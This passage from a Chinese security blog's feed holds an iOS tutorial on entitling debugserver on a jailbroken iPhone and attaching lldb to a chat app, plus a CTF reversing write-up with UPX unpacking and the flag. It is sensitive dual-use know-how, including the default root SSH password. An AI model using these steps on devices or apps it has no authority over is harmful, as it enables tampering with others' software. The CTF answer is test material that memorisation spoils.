class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>run-unsigned-code<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>task_for_pid-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="用ldid对debugserver签名-赋予权限"><a href="#用ldid对debugserver签名-赋予权限" class="headerlink" title="用ldid对debugserver签名 赋予权限"></a>用ldid对debugserver签名 赋予权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldid -Sxml全路径 debugserver全路径`</span><br><span class="line">例如：`ldid -Sent.xml debugserver</span><br></pre></td></tr></table></figure><p>这里要SSH连入iPhone手机执行命令：需要越狱您的iPhone,不会的请去看 <a href="https://mrmad.com.tw/category/jb/jailbreak">疯先生越狱</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启端口转发,数据线连SSH</span></span><br><span class="line">iproxy 2222 44        <span class="comment">#默认用Checkra1n越狱的端口号为44，其余的默认为22</span></span><br><span class="line"><span class="comment">#连入iPhone SSH</span></span><br><span class="line">ssh root@localhost -p 2222 <span class="comment">#iPhone默认ssh密码,alpine</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到debugserver存在的目录</span></span><br><span class="line">iPhone:~ root<span class="comment"># cd /Developer/usr/bin/</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># ls</span></span><br><span class="line">DTDeviceArbitration*  ScreenShotr*  axauditd*  debugserver*</span><br><span class="line"></span><br><span class="line"><span class="comment">#新建ent.xml文件</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># vim ent.xml   #将1、里面的ent.xml内容复制进去，并且保存</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后ldid赋予权限</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># ldid -Sent.xml debugserver</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#拷贝到系统目录</span></span><br><span class="line">iPhone:/Developer/usr/bin root<span class="comment"># copy ./debugserver /usr/bin</span></span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816143238501-832880721.png" alt="截屏2020-02-06下午7.52.51"> </p><h2 id="验证debugserver-进行动态调试"><a href="#验证debugserver-进行动态调试" class="headerlink" title="验证debugserver 进行动态调试"></a>验证debugserver 进行动态调试</h2><p>配置好iPhone端的debugserver后，就可以在Mac电脑上用lldb远程进行动态调试了<strong>lldb调试大全后续会讲</strong>，此次注重debugserver的配置，lldb一笔带，只要知道lldb是Mac上的客户端用来动态调试。</p><p>以调试Sugram 聊天软件为例</p><p>手机端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看Sugram的进程ID</span></span><br><span class="line">iPhone:~ root<span class="comment"># ps aux|grep &quot;Sugram&quot;</span></span><br><span class="line">mobile          6542   0.0  2.9  5055392  59136   ??  Ss    8:38PM   0:00.51 /var/containers/Bundle/Application/12CA134A-E92A-4F35-BEAA-542F84A0A39F/Sugram.app/Sugram</span><br><span class="line"></span><br><span class="line"><span class="comment">#注入方式对Sugram进行监听</span></span><br><span class="line">iPhone:~ root<span class="comment"># debugserver 127.0.0.1:1234 --attach 6542</span></span><br></pre></td></tr></table></figure><p>这时候被注入监听的那个APP就会进入卡死状态，因为debugserver已经对Sugram进行调试状态。</p><p>电脑端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先用iProxy 转发debugserver监听的端口</span></span><br><span class="line">iproxy 1234 1234</span><br><span class="line"><span class="comment">#进入lldb 进行远程调试</span></span><br><span class="line">lldb</span><br><span class="line">(lldb) process connect connect://localhost:1234</span><br></pre></td></tr></table></figure><h2 id="最后！"><a href="#最后！" class="headerlink" title="最后！"></a>最后！</h2><p>出现如下画面说明debugserver 配置正确，lldb也可以进行动态调试了。😁😁  –专注逆向、网络安全 Lee</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816143250533-1123187422.png" alt="截屏2020-02-06下午8.48.39"> </p><p>欢迎各位大佬：一起研究逆向、PWN、WEB安全、物联网安全</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144926834-60173329.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;blockquote&gt;
&lt;p&gt;iOS逆向里面比较重要的几项技能：动态调试、静态分析、HOOK关键函数、重签名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="iOS逆向" scheme="https://vxer-lee.github.io/categories/iOS%E9%80%86%E5%90%91/"/>
    
    
    <category term="iOS逆向学习系列" scheme="https://vxer-lee.github.io/tags/iOS%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯Re writeup</title>
    <link href="https://vxer-lee.github.io/2020/01/09/PCRe/HuxiangBei_Writeup/"/>
    <id>https://vxer-lee.github.io/2020/01/09/PCRe/HuxiangBei_Writeup/</id>
    <published>2020-01-09T06:22:52.000Z</published>
    <updated>2021-08-16T07:59:18.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>UPX的壳很好脱，可以在网上找现成的脱壳工具、或者是手动用单步跟踪法、ESP定律法。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152048299-570521887.png" alt="截屏2019-11-09下午9.45.21"> </p><h2 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h2><ol><li>找到OEP然后下断(这里入口点感觉被修改过变异过 不像正常的vc++2015程序的入口点)</li><li>右键字符串智能搜索</li><li>找到关键字 input Your Flag 单步跟踪</li></ol><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152057073-222047278.png" alt="截屏2019-11-09下午10.26.46"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152107738-391877921.png" alt="截屏2019-11-09下午10.29.31"> </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">01355386    52              push edx</span><br><span class="line">01355387    68 68A03501     push reverse.0135A068                    ; fmcj2y~&#123;</span><br><span class="line">0135538C    E8 16C0FFFF     call reverse.013513A7;    比较最后输入的命令行参数是否为(fmcj2y~&#123;)</span><br><span class="line">01355391    83C4 08         add esp,0x8          ;    类似于c:\tset\reverse.exe fmcj2y~&#123;</span><br><span class="line">01355394    85C0            test eax,eax</span><br><span class="line">01355396    74 19           je Xreverse.013553B1</span><br><span class="line">01355398    68 307E3501     push reverse.01357E30                    ; Input Error!\n</span><br><span class="line">0135539D    E8 D8BFFFFF     call reverse.0135137A</span><br><span class="line">013553A2    83C4 04         add esp,0x4</span><br><span class="line">013553A5    33C0            xor eax,eax</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152217668-1306588929.png" alt="111"> </p><h3 id="关键函数1"><a href="#关键函数1" class="headerlink" title="关键函数1"></a>关键函数1</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152229239-1896159586.png" alt="截屏2019-11-09下午10.55.47"> </p><h3 id="关键函数2"><a href="#关键函数2" class="headerlink" title="关键函数2"></a>关键函数2</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152238213-683810869.png" alt="截屏2019-11-09下午11.01.54"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152251437-1421067463.png" alt="截屏2019-11-09下午11.00.05"> </p><p>41A078地址的值为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">41</span>A078[<span class="number">0</span>] = <span class="number">50</span></span><br><span class="line"><span class="number">41</span>A078[<span class="number">1</span>] = c6</span><br><span class="line"><span class="number">41</span>A078[<span class="number">2</span>] = f1</span><br><span class="line"><span class="number">41</span>A078[<span class="number">3</span>] = e4</span><br><span class="line"><span class="number">41</span>A078[<span class="number">4</span>] = e3</span><br><span class="line"><span class="number">41</span>A078[<span class="number">5</span>] = e2</span><br><span class="line"><span class="number">41</span>A078[<span class="number">6</span>] = <span class="number">9</span>a</span><br><span class="line"><span class="number">41</span>A078[<span class="number">7</span>] = a1</span><br><span class="line"><span class="number">41</span>A078[<span class="number">8</span>] = a7</span><br><span class="line"><span class="number">41</span>A078[<span class="number">9</span>] = de</span><br><span class="line"><span class="number">41</span>A078[<span class="number">10</span>] = da</span><br><span class="line"><span class="number">41</span>A078[<span class="number">11</span>] = <span class="number">46</span></span><br><span class="line"><span class="number">41</span>A078[<span class="number">12</span>] = ab</span><br><span class="line"><span class="number">41</span>A078[<span class="number">13</span>] = <span class="number">2</span>e</span><br><span class="line"><span class="number">41</span>A078[<span class="number">14</span>] = ff</span><br><span class="line"><span class="number">41</span>A078[<span class="number">15</span>] = db</span><br></pre></td></tr></table></figure><p>最后将每个值减1<br>得到flag<br><code>flag&#123;4fc5f0e3e2e199a0a6ddd945aa2dfeda&#125;</code></p><hr><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152308408-1498687137.png" alt="截屏2019-11-09下午11.18.50"> </p><p>欢迎加入QQ群：一起研究逆向 、PWN、WEB安全、物联网安全</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816152334302-1095832852.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;查壳&quot;&gt;&lt;a href=&quot;#查壳&quot; class=&quot;headerlink&quot; title=&quot;查壳&quot;&gt;&lt;/a&gt;查壳&lt;/h2&gt;&lt;p&gt;UPX的壳很好脱，可以在网上找现成的脱壳工具、</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="ctf系列" scheme="https://vxer-lee.github.io/tags/ctf%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
</feed>
